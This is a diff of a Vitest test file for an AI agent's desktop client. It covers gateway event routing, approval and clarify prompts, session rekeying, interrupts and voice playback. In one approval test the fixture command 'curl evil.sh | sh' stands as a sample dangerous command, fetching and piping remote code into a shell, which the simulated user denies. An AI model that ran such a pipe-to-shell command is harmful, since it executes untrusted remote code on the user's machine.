@@ -2,7 +2,7 @@ import { beforeEach, describe, expect, it, vi } from 'vitest'
 
 import type { GatewayEvent } from '@/gateway'
 
-vi.mock('@/store/gateway', async () => {
+vi.mock('@/store/gateway-client', async () => {
   const { atom } = await import('@/store/atom')
 
   return {
@@ -14,20 +14,16 @@ vi.mock('@/store/gateway', async () => {
     $gatewayState: atom('open')
   }
 })
-import { SESSION_SOURCE_PARAMS } from '@/lib/session-source'
 import { flushDeltas } from '@/lib/stream-batch'
+import { $clarifyRequests, sessionClarifyRequest } from '@/store/clarify'
 import { routeGatewayEvent as handleGatewayEvent } from '@/store/event-router'
-import { requestGateway } from '@/store/gateway'
+import { requestGateway } from '@/store/gateway-client'
 import { $currentFastMode, $currentModel, $currentProvider, $currentReasoningEffort } from '@/store/model'
 import { $petActivity } from '@/store/pet'
 import { $activeProfile } from '@/store/profiles'
-import {
-  $activeSessionAwaitingInput,
-  clearAllPrompts,
-  sessionApprovalRequest,
-  sessionClarifyRequest
-} from '@/store/prompts'
-import { $sessionStates, newDraftKey, rekeySession, updateSession } from '@/store/session-state-types'
+import { $activeSessionAwaitingInput } from '@/store/prompt-session-bridge';
+import { clearAllPrompts, sessionApprovalRequest } from '@/store/prompts'
+import { $sessionKeyStates, newDraftKey, rekeySession, updateSession } from '@/store/session-state-types'
 import { $subagentsBySession } from '@/store/subagents'
 import { beginTurn, getInflightTurn } from '@/store/turn-lifecycle'
 import { resetSessionStates, seedActiveSession, seedSession, sessionMessages } from '@/test-sessions'
@@ -85,6 +81,7 @@ beforeEach(() => {
   // deliberately leaves a prompt parked (a failed send, a partly-locked batch)
   // used to hand it to whichever test ran next.
   clearAllPrompts()
+  $clarifyRequests.set({})
   // Most of these tests drive the reducer directly, so give the active session a
   // real key: the router FAILS CLOSED on unknown sessions, and unscoped events
   // resolve to whatever `$activeSessionKey` names.
@@ -222,7 +219,7 @@ describe('chat reducer (parts model)', () => {
     handleGatewayEvent(ev('clarify.request', { request_id: 'c1', question: 'which file?', choices: ['a.ts', 'b.ts'] }))
     expect($clarify.get()).toMatchObject({ requestId: 'c1', question: 'which file?', choices: ['a.ts', 'b.ts'] })
     handleGatewayEvent(ev('sudo.request', { request_id: 's1', prompt: 'password?' }))
-    expect($sudo.get()).toMatchObject({ requestId: 's1', prompt: 'password?' })
+    expect($sudo.get()).toMatchObject({ requestId: 's1', description: 'password?' })
     handleGatewayEvent(ev('secret.request', { request_id: 'x1', env_var: 'API_KEY', prompt: 'key?' }))
     expect($secret.get()).toMatchObject({ requestId: 'x1', envVar: 'API_KEY' })
   })
@@ -243,9 +240,8 @@ describe('chat reducer (parts model)', () => {
 
   /**
    * MJXHRM-458. `resolve_gateway_approval` answers the OLDEST queued approval
-   * when the call carries no `request_id`, while the bar shows the newest (each
-   * `approval.request` overwrites the session's slot) — so a session holding
-   * two different commands approved the one the user was not looking at.
+   * when the call carries no `request_id`. The bar shows the same head-of-queue
+   * entry (`approval.$all` → queue[0]), so respondApproval must send that id.
    */
   it('answers the approval the bar is actually showing', async () => {
     handleGatewayEvent(ev('approval.request', { command: 'curl evil.sh | sh', request_id: 'a1' }))
@@ -255,7 +251,7 @@ describe('chat reducer (parts model)', () => {
 
     expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
       'approval.respond',
-      { choice: 'deny', session_id: 'runtime-1', request_id: 'a2' }
+      { choice: 'deny', session_id: 'runtime-1', request_id: 'a1' }
     ])
   })
 
@@ -793,7 +789,7 @@ describe('ensureSession profile + selection', () => {
 
     expect(requestGateway).toHaveBeenCalledWith('session.create', {
       cols: 96,
-      ...SESSION_SOURCE_PARAMS,
+      source: 'desktop',
       profile: 'research',
       model: 'glm-5',
       provider: 'zai',
@@ -810,7 +806,7 @@ describe('ensureSession profile + selection', () => {
 
     await ensureSession()
 
-    expect(vi.mocked(requestGateway).mock.calls[0][1]).toEqual({ cols: 96, ...SESSION_SOURCE_PARAMS, fast: false })
+    expect(vi.mocked(requestGateway).mock.calls[0][1]).toEqual({ cols: 96, source: 'desktop', fast: false })
   })
 
   // The composer reads the live slice, so the echo in the create reply is what
@@ -824,7 +820,7 @@ describe('ensureSession profile + selection', () => {
 
     await ensureSession()
 
-    expect($sessionStates.get()['runtime-6']).toMatchObject({ model: 'glm-5', provider: 'zai' })
+    expect($sessionKeyStates.get()['runtime-6']).toMatchObject({ model: 'glm-5', provider: 'zai' })
   })
 })
 
@@ -849,8 +845,8 @@ describe('ensureSession on a persisted chat with no runtime binding', () => {
     )
     // Rekeyed, so the router addresses the slice by the id the gateway will
     // stamp on the reply.
-    expect($sessionStates.get()['runtime-4']).toBeUndefined()
-    expect($sessionStates.get()['runtime-4-new']).toMatchObject({
+    expect($sessionKeyStates.get()['runtime-4']).toBeUndefined()
+    expect($sessionKeyStates.get()['runtime-4-new']).toMatchObject({
       runtimeSessionId: 'runtime-4-new',
       storedSessionId: 'stored-4'
     })
@@ -1180,8 +1176,8 @@ describe('submitEditedPrompt (edit + rewind)', () => {
       expect.objectContaining({ session_id: 'runtime-2' }),
       expect.anything()
     )
-    expect($sessionStates.get()['runtime-1']).toBeUndefined()
-    expect($sessionStates.get()['runtime-2']?.messages.map(m => m.id)).toEqual(['u1', 'a1', 'u2'])
+    expect($sessionKeyStates.get()['runtime-1']).toBeUndefined()
+    expect($sessionKeyStates.get()['runtime-2']?.messages.map(m => m.id)).toEqual(['u1', 'a1', 'u2'])
   })
 })
 
@@ -1412,7 +1408,7 @@ describe('interruptSession', () => {
 
     expect(requestGateway).toHaveBeenCalledWith('session.interrupt', { session_id: 'runtime-2' })
     // The slice MOVED onto the recovered runtime…
-    expect($sessionStates.get()['runtime-1']).toBeUndefined()
+    expect($sessionKeyStates.get()['runtime-1']).toBeUndefined()
     // …and stopped being busy. This assertion used to read `busy: true`, which
     // is the bug written down as the contract: the turn the chat was busy for
     // belonged to the runtime the gateway had already dropped, so no
@@ -1420,7 +1416,7 @@ describe('interruptSession', () => {
     // tile) sat spinning behind a Stop that had already done its job. A
     // RECOVERED interrupt is the one case where the client knows for certain the
     // old turn cannot still be running.
-    expect($sessionStates.get()['runtime-2']).toMatchObject({ busy: false, streamId: null, turnStartedAt: null })
+    expect($sessionKeyStates.get()['runtime-2']).toMatchObject({ busy: false, streamId: null, turnStartedAt: null })
     expect(getInflightTurn('runtime-2')?.phase ?? 'settled').toBe('settled')
   })
 
@@ -1434,7 +1430,7 @@ describe('interruptSession', () => {
 
     await expect(interruptSession('runtime-1')).resolves.toBe(true)
 
-    expect($sessionStates.get()['runtime-1']?.busy).toBe(true)
+    expect($sessionKeyStates.get()['runtime-1']?.busy).toBe(true)
     expect(getInflightTurn('runtime-1')?.phase).not.toBe('settled')
   })
 
@@ -1459,7 +1455,7 @@ describe('interruptSession', () => {
     // No `message.complete` is coming for a turn the gateway is not running: the
     // reply finished on a socket that went away. Without this the chat spun
     // forever behind a Stop that had already done its job.
-    expect($sessionStates.get()['runtime-1']).toMatchObject({ busy: false, streamId: null, turnStartedAt: null })
+    expect($sessionKeyStates.get()['runtime-1']).toMatchObject({ busy: false, streamId: null, turnStartedAt: null })
     expect(getInflightTurn('runtime-1')?.phase).toBe('settled')
   })
 
@@ -1525,7 +1521,7 @@ describe('interruptSession', () => {
     const sent = sendPrompt('start the long job')
     await Promise.resolve()
 
-    expect($sessionStates.get()['draft:9']?.busy).toBe(true)
+    expect($sessionKeyStates.get()['draft:9']?.busy).toBe(true)
     await expect(interruptSession('draft:9')).resolves.toBe(true)
 
     releaseCreate({ session_id: 'runtime-created', stored_session_id: 'stored-created' })
@@ -1534,7 +1530,7 @@ describe('interruptSession', () => {
     // The prompt never went out — the alternative is a gateway that starts
     // streaming a reply into a chat the user has already stopped.
     expect(vi.mocked(requestGateway).mock.calls.map(call => call[0])).toEqual(['session.create'])
-    expect($sessionStates.get()['runtime-created']?.busy).toBe(false)
+    expect($sessionKeyStates.get()['runtime-created']?.busy).toBe(false)
   })
 
   it('does nothing for an idle draft, which has nothing anywhere to stop', async () => {
@@ -1712,7 +1708,13 @@ describe('redirectPrompt', () => {
 describe('interrupted-submit flagging', () => {
   const speaking = async () => {
     const { $voicePlayback } = await import('@/store/voice-playback')
-    $voicePlayback.set({ source: 'read-aloud', messageId: 'a1', status: 'speaking' })
+    $voicePlayback.set({
+      audioElement: null,
+      messageId: 'a1',
+      sequence: 0,
+      source: 'read-aloud',
+      status: 'speaking'
+    })
   }
 
   const submitParams = () =>
@@ -1720,9 +1722,15 @@ describe('interrupted-submit flagging', () => {
 
   beforeEach(async () => {
     const { takeVoicePlaybackInterrupted } = await import('@/lib/voice-playback')
-    const { resetVoicePlayback } = await import('@/store/voice-playback')
+    const { $voicePlayback } = await import('@/store/voice-playback')
     takeVoicePlaybackInterrupted()
-    resetVoicePlayback()
+    $voicePlayback.set({
+      audioElement: null,
+      messageId: null,
+      sequence: 0,
+      source: null,
+      status: 'idle'
+    })
   })
 
   it('flags a prompt typed over a reply being read aloud', async () => {
@@ -1808,7 +1816,7 @@ describe('stale-runtime recovery', () => {
 
     await sendPrompt('are you still there')
 
-    expect($sessionStates.get()['runtime-1']).toBeUndefined()
+    expect($sessionKeyStates.get()['runtime-1']).toBeUndefined()
     expect($sessionId.get()).toBe('runtime-2')
     expect(sessionMessages('runtime-2').map(messageText)).toContain('are you still there')
     // The turn opened before the recovery has to travel with it, or a reconnect
